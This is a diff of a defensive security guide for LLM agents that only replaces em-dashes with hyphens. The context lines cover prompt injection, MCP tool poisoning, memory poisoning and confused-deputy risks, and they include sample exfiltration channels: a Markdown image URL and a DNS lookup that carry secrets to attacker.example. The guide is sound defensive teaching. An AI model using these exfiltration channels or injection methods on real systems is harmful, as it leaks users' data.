@@ -127,13 +127,13 @@ def read_ticket(ticket_id: str) -> str:
 ```
 
 Why this works: the model no longer supplies a path. It supplies an ID that the tool maps to
-a path it controls. The system prompt line can stay — it just is not the control any more.
+a path it controls. The system prompt line can stay - it just is not the control any more.
 
 ## Direct vs Indirect Injection
 
 `LLM01:2025` · `CWE-1427`
 
-Direct injection is the user typing an instruction that overrides your intent —
+Direct injection is the user typing an instruction that overrides your intent -
 jailbreaks, system-prompt extraction. The blast radius is the user's own session and their
 own permissions. Often it is a product problem, not a security one.
 
@@ -218,7 +218,7 @@ specific operations as separate tools with argument arrays, or run them in a san
 credentials and no network. `CWE-78`
 
 Validate on the tool side. `additionalProperties: false` and `minimum`/`maximum` in the
-schema are a hint to the model, not a gate — schemas constrain generation, they do not
+schema are a hint to the model, not a gate - schemas constrain generation, they do not
 enforce it, and strict-validation features vary by provider and are not a substitute.
 Re-validate in the function.
 
@@ -252,7 +252,7 @@ Why this works: the address space the model can reach is two values, both derive
 authenticated actor. There is no string the model can produce that reaches a third party.
 
 Human approval for irreversible or outward-facing actions. Deleting, paying, publishing,
-merging, emailing an external party. Show the actual resolved arguments — a confirmation
+merging, emailing an external party. Show the actual resolved arguments - a confirmation
 dialog that shows a summary the model wrote is not a confirmation.
 
 ## Exfiltration Channels People Miss
@@ -263,7 +263,7 @@ The outbound leg of the trifecta is rarely a tool named `send_data`.
 
 | Channel | Mechanism |
 |---|---|
-| Markdown image | `![](https://attacker.example/x.png?d=<secret>)` — the renderer issues a GET with the data in the query string, no click required |
+| Markdown image | `![](https://attacker.example/x.png?d=<secret>)` - the renderer issues a GET with the data in the query string, no click required |
 | Link the user clicks | Same idea, one click of social engineering |
 | A fetch/browse tool | The agent is told to fetch a URL that contains the secret |
 | DNS | `<secret>.attacker.example` resolved by any lookup; survives HTTP egress blocking |
@@ -288,7 +288,7 @@ channel; it does not prove it is closed.
 `A01:2025` · ASVS V8 · `CWE-441`, `CWE-639`
 
 The agent holds a service credential with broad rights and acts on behalf of a user with
-narrow rights. Injected content — or an ordinary confused model — makes it use its own
+narrow rights. Injected content - or an ordinary confused model - makes it use its own
 rights for the user's request. Every user effectively has admin.
 
 ```python
@@ -312,7 +312,7 @@ worst case collapses from tenant-wide to single-user.
 
 Where per-user tokens are impossible, pass the actor identity to every tool and scope the
 query by it server-side, as in `get_order_totals` above. Never accept a user ID, tenant ID,
-or role as a tool argument — the model can write any value it likes.
+or role as a tool argument - the model can write any value it likes.
 
 ## MCP: Server Trust, Tool Poisoning, and Rug Pulls
 
@@ -350,11 +350,11 @@ Controls:
 - Treat tool *results* as untrusted content too. An MCP server returns whatever it wants.
 - `stdio` versus HTTP: `stdio` limits the server to the client process and takes credentials
   from the environment, and the spec says stdio implementations should not use its OAuth
-  flow. HTTP servers are network-reachable and must be authorized — the spec requires a
+  flow. HTTP servers are network-reachable and must be authorized - the spec requires a
   local HTTP server to demand an auth token or use a restricted IPC mechanism, or it is
   reachable from any local process and from a browser via DNS rebinding.
 - OAuth scoping: request the minimum scope, and validate that tokens were issued for your
-  server. The spec forbids token passthrough — an MCP server must not accept a token that
+  server. The spec forbids token passthrough - an MCP server must not accept a token that
   was not issued for it, and must not forward the client's token downstream.
 - One MCP server is one trust boundary. A server with filesystem access and a server with
   outbound network access in the same context recreate the trifecta.
@@ -406,10 +406,10 @@ def run_agent(messages: list, actor: User, depth: int = 0):
 
 Why this works: four independent ceilings, none of which the model can raise, and a
 per-user reservation so one tenant cannot exhaust the shared budget. Failing closed matters
-— a budget check that errors open is not a budget.
+- a budget check that errors open is not a budget.
 
-Memory poisoning. If the agent writes to a persistent store — a memory file, a vector
-index, a summary row — injected content written today is read as trusted context tomorrow,
+Memory poisoning. If the agent writes to a persistent store - a memory file, a vector
+index, a summary row - injected content written today is read as trusted context tomorrow,
 in a session the attacker is not present for. Scope memory per user, never let one user's
 content reach another's context, keep memory writes reviewable, and prefer structured fields
 over free text so an instruction has nowhere to hide.
@@ -418,8 +418,8 @@ over free text so an instruction has nowhere to hide.
 
 `LLM08:2025`, `LLM01:2025` · `A01:2025` · ASVS V8 · `CWE-639`
 
-The corpus is an injection vector. Any document a user can add — an uploaded PDF, a synced
-wiki page, a scraped site, a support ticket — is untrusted content that will be retrieved and
+The corpus is an injection vector. Any document a user can add - an uploaded PDF, a synced
+wiki page, a scraped site, a support ticket - is untrusted content that will be retrieved and
 placed in a context that has tools.
 
 Authorize retrieval per user, in the query. A vector index that ignores permissions is a
@@ -444,7 +444,7 @@ def retrieve(question: str, actor: User, k: int = 8):
 
 Why this works: the constraint is part of the query, so there is no post-filter step to
 forget and no window in which unauthorized chunks exist in memory. Build the filter on the
-server from the session — a filter sent by the client, or generated by the model, is a
+server from the session - a filter sent by the client, or generated by the model, is a
 client-side check.
 
 Also:
@@ -484,7 +484,7 @@ subprocess.run([tool_input["tool"], *tool_input["args"]], shell=False,
 ```
 
 Why this works: no string is interpreted by a shell, so `;`, `&&`, `$()`, and backticks are
-inert. Note `args` still needs validation — an argument array does not stop `--config` from
+inert. Note `args` still needs validation - an argument array does not stop `--config` from
 pointing somewhere it should not.
 
 ## Secrets and Conversation Logs
@@ -510,12 +510,12 @@ Without a tool-call log you cannot answer "what did it do" after an incident. Lo
 
 - Correlation ID, actor, session, and step number
 - Tool name and the resolved arguments, masked
-- Outcome: allowed, denied, error — and which authorization decision produced a denial
+- Outcome: allowed, denied, error - and which authorization decision produced a denial
 - Whether a human approved, and who
 - Token usage, and which content sources entered the context
 
 Mask within arguments, not just at the top level: a tool argument can carry a whole record.
-Log identifiers and decisions rather than raw content where you can — a transcript in the
+Log identifiers and decisions rather than raw content where you can - a transcript in the
 log is a second copy of the data with weaker access control.
 
 ## Model Supply Chain
@@ -531,7 +531,7 @@ deserialize objects, not a sandbox.
 # Vulnerable: arbitrary code executes at load time
 model = torch.load("downloaded_model.bin")
 
-# Fixed: safetensors — a data format with no code path
+# Fixed: safetensors - a data format with no code path
 from safetensors.torch import load_file
 state = load_file("downloaded_model.safetensors")
 model.load_state_dict(state)
@@ -552,7 +552,7 @@ Input classifiers, output scanners, and canary tokens are worth deploying. They 
 payloads, raise the cost of an attack, and give you detection you would not otherwise have.
 
 They reduce the rate. They do not eliminate the class. Prompt injection is not a signature
-problem — an attacker with an oracle iterates until something passes, and paraphrase,
+problem - an attacker with an oracle iterates until something passes, and paraphrase,
 encoding, translation, and multi-step setups all evade classifiers that block the obvious
 form.
 
